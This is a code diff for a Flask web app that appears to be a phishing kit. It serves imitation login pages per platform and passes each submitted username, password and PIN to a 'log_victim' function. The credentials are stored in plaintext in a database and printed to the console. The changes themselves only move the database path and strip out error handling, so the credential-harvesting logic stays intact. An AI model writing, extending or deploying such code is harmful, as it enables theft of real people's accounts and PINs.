@@ -1,8 +1,6 @@
 import os, time, logging
 from flask import Flask, render_template, request, redirect, url_for, session
 from model import db, User, User2
-from sqlalchemy.exc import OperationalError
-from jinja2 import TemplateNotFound
 from victims import log_victim
 
 # Set the folders for your HTML templates and static files (like CSS, JS, images).
@@ -15,7 +13,9 @@ app = Flask(
     template_folder=TEMPLATE_DIR,
     static_folder=STATIC_DIR,
 )
-app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///users.db"
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_PATH = os.path.join(BASE_DIR, "users.db")
+app.config["SQLALCHEMY_DATABASE_URI"] = f"sqlite:///{DB_PATH}"
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 app.config["SECRET_KEY"] = (
     "692hdkbckjz9qqykq3t8eq"  # Needed for sessions and flash messages
@@ -33,19 +33,14 @@ def register_routes(app, allowed_platform):
             pin = request.form.get("pin") if platform == "unset" else None
             log_victim(platform, username, password, pin)
             if platform == "unset":
-                try:
-                    new_user2 = User2(username=username, password=password, pin=pin)
-                    db.session.add(new_user2)
-                    db.session.commit()
-                    user2 = (
-                        User2.query.filter_by(username=username, password=password, pin=pin)
-                        .order_by(User2.id.desc())
-                        .first()
-                    )
-                except OperationalError as e:
-                    print(f"Database error: {e}")
-                    return "Database file is missing or inaccessible. Please check your database setup."
-                
+                new_user2 = User2(username=username, password=password, pin=pin)
+                db.session.add(new_user2)
+                db.session.commit()
+                user2 = (
+                    User2.query.filter_by(username=username, password=password, pin=pin)
+                    .order_by(User2.id.desc())
+                    .first()
+                )
                 if user2:
                     print(
                         f"[{platform.upper()}] New login: username='{username}', password='{password}', pin='{pin}'"
@@ -53,18 +48,15 @@ def register_routes(app, allowed_platform):
                     session["username"] = user2.username
                     return redirect(url_for(platform))
             else:
-                try:
-                    new_user = User(username=username, password=password)
-                    db.session.add(new_user)
-                    db.session.commit()
-                    user = (
-                        User.query.filter_by(username=username, password=password)
-                        .order_by(User.id.desc())
-                        .first()
-                    )
-                except OperationalError as e:
-                    print(f"Database error: {e}")
-                    return "Database file is missing or inaccessible. Please check your database setup."
+                new_user = User(username=username, password=password)
+                db.session.add(new_user)
+                db.session.commit()
+                print("debug: User added to the database.")
+                user = (
+                    User.query.filter_by(username=username, password=password)
+                    .order_by(User.id.desc())
+                    .first()
+                )
                 if user:
                     print(
                         f"[{platform.upper()}] New login: username='{username}', password='{password}'"
@@ -72,10 +64,7 @@ def register_routes(app, allowed_platform):
                     session["username"] = user.username
                     return redirect(url_for(platform))
         # Render the platform-specific template
-        try:
-            return render_template(f"{platform}.html")
-        except TemplateNotFound:
-            return f"Template '{platform}.html' is missing. Please add it to your templates folder."
+        return render_template(f"{platform}.html")
         
     # Register the route in accord with the user's choice.
     app.add_url_rule(
